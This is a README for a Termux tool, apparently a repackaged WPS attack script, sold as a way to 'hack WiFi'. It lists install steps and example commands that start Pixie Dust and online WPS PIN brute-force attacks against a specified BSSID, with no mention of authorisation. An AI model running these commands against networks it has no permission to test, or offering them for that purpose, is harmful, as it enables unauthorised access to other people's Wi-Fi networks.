## Wifi-HackV2
### Hack WIfi Using Termux! (Requires Root)

<p align="center"><img src="https://i.postimg.cc/nrjT50GD/Screenshot-2026-10-14-21-28-29-661-com-termux.jpg"></p>

### Installation :

```bash
$ apt update && apt upgrade
$ pkg install -y root-repo
$ pkg install -y git tsu python wpa-supplicant pixiewps iw
$ git clone https://github.com/MD-HASIB-HOSSEN/Wifi-HackV2
$ cd Wifi-HackV2
$ chmod +x Wifi-Hack.py
$ sudo python Wifi-Hack.py --help
```

#### Example : `sudo python Wifi-Hack.py -i wlan0 -K`

#### Note: 
**First turn off your Wifi.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python Wifi-Hack.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python Wifi-Hack.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python Wifi-Hack.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
